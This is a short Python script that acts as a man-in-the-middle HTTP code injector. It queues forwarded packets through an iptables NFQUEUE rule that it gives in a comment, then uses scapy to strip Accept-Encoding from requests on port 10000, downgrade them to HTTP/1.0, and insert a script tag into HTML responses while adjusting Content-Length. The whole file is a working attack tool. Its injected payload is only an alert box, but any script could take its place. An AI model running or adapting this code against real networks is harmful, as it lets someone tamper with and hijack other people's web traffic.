#!/usr/bin/env python

import netfilterqueue as netfilterq
import scapy.all as scapy
import re

# This script should be run in linux
# It relies on iptable queue to store the received packets before redirection
# iptables -I FORWARD -j NFQUEUE --queue-num 0

ack_list = []

def access_packet_queue():
    #NetFilter instance
    queue = netfilterq.NetfilterQueue()
    #Binding to previous created queue
    queue.bind(0, packet_callback)
    queue.run()

def packet_crafter(pack, load):
    pack[scapy.Raw].load = load
    del pack[scapy.IP].len
    del pack[scapy.IP].chksum
    del pack[scapy.TCP].chksum
    return pack


def packet_callback(packet):

    #Converting packet from the queue in toscapy format
    s_packet = scapy.IP(packet.get_payload())
    # Filtering DNS Responses
    if s_packet.haslayer(scapy.Raw):
        # If packet is HTTP Request
        s_packet_load = s_packet[scapy.Raw].load
        if s_packet[scapy.TCP].dport == 10000:
            print("REQUEST \n")
            #Getting payload to substitute the encoding with ""
            s_packet_load = re.sub(r'Accept-Encoding:.*?\\r\\n', "", s_packet_load)
            s_packet_load = s_packet_load.replace("HTTP/1.1","HTTP/1.0")
        elif s_packet[scapy.TCP].sport == 10000:
            print("RESPONSE \n")
            injection_code = "<script>alert('you just got hacked')</script>"
            s_packet_load = s_packet_load.replace("</body>", injection_code + "</body>")
            #Extracting Content Length number with non matching group
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", s_packet_load)
            #Only use on HTML requests
            if content_length_search and "text/html" in s_packet_load:
                print ("GOT HTML \n")
                content_length = content_length_search.group(1)
                updated_len = int(content_length) + len(injection_code)
                s_packet_load = s_packet_load.replace(content_length, str(updated_len))

        if s_packet_load != s_packet[scapy.Raw].load:
            modified_packet = packet_crafter(s_packet, s_packet_load)
            packet.set_payload(str(modified_packet))

    packet.accept()


access_packet_queue()
